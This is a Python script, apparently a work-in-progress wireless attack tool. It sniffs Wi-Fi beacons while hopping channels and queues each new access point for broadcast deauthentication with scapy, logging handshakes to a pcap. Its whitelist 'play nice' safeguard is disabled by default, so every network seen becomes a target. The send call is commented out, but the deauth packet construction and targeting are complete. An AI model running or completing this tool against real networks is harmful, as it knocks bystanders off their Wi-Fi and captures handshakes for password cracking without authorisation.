#!/usr/bin/env python
import sys,os,thread,time
from scapy.all import *
import random # Can remove after completion
import Queue
import pyric
import pyric.pyw as pyw
import pyric.lib.libnl as nl
import pyric.utils.channels as ch
import itertools

# Global Variables
play_nice = False  # By changing this value to False you state that you understand the implications of violating FCC regualations
attack_queue = Queue.Queue()
ap_list = []
attack_list = []
capture = time.strftime("%Y.%m.%d-%H.%M.%S.pcap")
pktdump = PcapWriter("./logs/" + capture, append=True,sync=True)
recon_iface = "wlan0"
attack_iface = "wlan1"
client = "FF:FF:FF:FF:FF"  # Set to broadcast to deauth all clients as well.  Increases odds of capturing handshakes
count = 2 # How many Deauth Packets do you want to send?

# Probing will continually sniff for new Beacons and EAPOL while recording in pcap file.
def ProbingBeacons(pkt) :
  if pkt.haslayer(Dot11) :
		if pkt.haslayer(Dot11Auth) or pkt.haslayer(Dot11Beacon):
			pktdump.write(pkt)
			ap_channel = str(ord(pkt[Dot11Elt:3].info))
			#print "BSSID: %s , Channel: %s" % (pkt.addr2,ap_channel)
			if pkt.addr2 not in ap_list:
				ap_list.append(pkt.addr2)
				if play_nice == True:
					PlayNice(pkt.addr2,ap_channel)
				else:
					attack_queue.put((pkt.addr2,ap_channel))

# Scapy's Sniffing service - wlan0 should be the primary card for sniffing.
def Sniffing(iface):
	sniff(iface=iface, prn=ProbingBeacons, store=0)

# Main attacking function.
def GetAngry(data):
	(bssid,channel) = data
	if bssid not in attack_list:
		print "Attacking BSSID: %s on Channel %s" % (bssid, channel)
		time.sleep(random.randint(1,10))
		#SetIfaceChannel('wlan0',channel)
		Deauth(bssid)
		# Random sleep time between 1 and 5 to test for wireless card change time
		attack_list.append(bssid)

	elif bssid in attack_list:
		print "Already Attacked BSSID: %s" % bssid
	else:
		print "Something went wrong"

# PlayNice will check to make sure the BSSID is on the whitelist.
def PlayNice(bssid,channel):
	if bssid in whitelist:
		print "Approved SSID... Attack!"
		attack_queue.put((bssid,channel))
	else:
		print "Avoiding FCC Violations."

# TimeSink will add APs to Queue as seen and pop them off as completed. 
def TimeSink():
	while True:
		if attack_queue.empty():
			time.sleep(5)
		elif not attack_queue.empty():
			GetAngry(attack_queue.get())
		else:
			print "Something went wrong"

# Make sure the Interfaces that are being utilized are in Monitor Mode
def SetMonitorMode(iface,action):
	wcard = pyw.getcard(iface)
	# bring card down to ensure safe change
	pyw.down(wcard)

	if action == "monitor":
		# check to make sure the card isn't already in monitor mode
		if pyw.modeget(wcard) == 'monitor':
			print "Card %s is already in monitor Mode" % str(iface)
		else:
			print "Putting card %s into monitor mode" % str(iface)
			pyw.modeset(wcard,action)

	elif action == "managed":
		# check to make sure the card isn't already in managed mode
		if pyw.modeget(wcard) == 'managed':
			print "Card %s is already in managed Mode" % str(iface)
		else:
			print "Putting card %s into managed mode" % str(iface)
			pyw.modeset(wcard,action)
	else:
		print "Unrecongnized command"
	# Bring card back up, should now be changed.  
	pyw.up(wcard)


# Changes the Interface (typically of wlan1) to make sure it's listening for the EAPOL Packets. 
def SetIfaceChannel(iface,channel):
	print "Changing %s to channel %s" % (iface[1],int(channel))
	pyw.chset(iface,int(channel), None)


# Check Interfaces - Make sure there is at least two Wireless Cards that support Monitor Mode
def CheckInterfaces():
	if len(pyw.winterfaces()) < 2:
		return False
	else:
		return True

# HoppinIface - Hop the primary Interface to find more beacons.  Much like airodump-ng channel hop
def HoppinIface(iface):
	channels = []
	# Get information for iface from Pyric
	w0 = pyw.getcard(iface)
	pinfo = pyw.phyinfo(w0)

	# I need to figure out how to get into a list the full availability of channels
	# for d in pinfo['bands']:
	# 	HT,VHT = pinfo['bands'][d]['HT'],pinfo['bands'][d]['VHT']
	# 	#print "Band: %s HT/VHT: %s/%s" % (d,HT,VHT)
	# 	if HT:
	# 		print pinfo['bands'][d]['rates']
	# 	if VHT:
	# 		print pinfo['bands'][d]['rates']

	channels = ["01","02","03","04","05","06","07","08","09","10","11","12","13","14","36","40","44","48","52","56","60","64","100","104","108","112","116","120","124","128","132","136"]
	# loop for the entire channel set
	for channel in itertools.cycle(channels):
		SetIfaceChannel(w0,channel)
		time.sleep(3) # Time to sleep per channel


# Debugging Interfaces
def DebuggingInterface(iface):
	interfaces = pyw.interfaces()
	print interfaces
	print "Is %s an interface? %s" % (iface, pyw.isinterface(iface))
	print "Is %s a wireless device? %s" % (iface,pyw.iswireless(iface))
	w0 = pyw.getcard(iface)
	print "Is %s active?  %s" % (iface, pyw.isup(w0))
	print "Is %s blocked? %s" % (iface, pyw.isblocked(w0))
	iinfo = pyw.ifinfo(w0)
	print iinfo
	pinfo = pyw.phyinfo(w0)
	print pinfo['bands']

# Deauth is the Python implementation of sending deauth packets with Scapy
def Deauth(bssid):
	packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
	for n in range(int(count)):
		# Test and make sure the deauth is coming from the correct interface
		#sendp(packet,iface=attack_iface)
		print 'Deauth sent via: ' + attack_iface + ' to BSSID: ' + bssid + ' for Client: ' + client


# Start the application and the threads.
if __name__ == "__main__":
	# Make sure you have at least 2 Wireless Interfaces to Start
	if CheckInterfaces():
		print "Good to Go"
	else:
		print "Not enough Wireless Interfaces..."
		exit("\nExiting...")

	# Make sure the interfaces are in Monitor Mode
	for ifaces in pyw.winterfaces():
		SetMonitorMode(ifaces,'monitor')

	# Read in the whitelist to make sure to avoid FCC Violations. 
	f = open('whitelist.txt')
	whitelist = f.readlines()

	# Start the threading of the Sniff,Hopping, and Queue
	try:
		print "Sniffing for Beacon Frames..."
		thread.start_new(Sniffing, (recon_iface,))
		thread.start_new(HoppinIface,(recon_iface,))
		thread.start_new(TimeSink, ())

		while True:
			# Report back every 5 seconds of Stats
			time.sleep(5)
			print "Captured APs: %i" % len(ap_list)
			print "Attacked APs: %i" % len(attack_list)
			print "Queue Length: %i" % attack_queue.qsize()
			print "Whitelist Length: %i" % len(whitelist)

	except KeyboardInterrupt:
		sys.exit("\nExiting...")
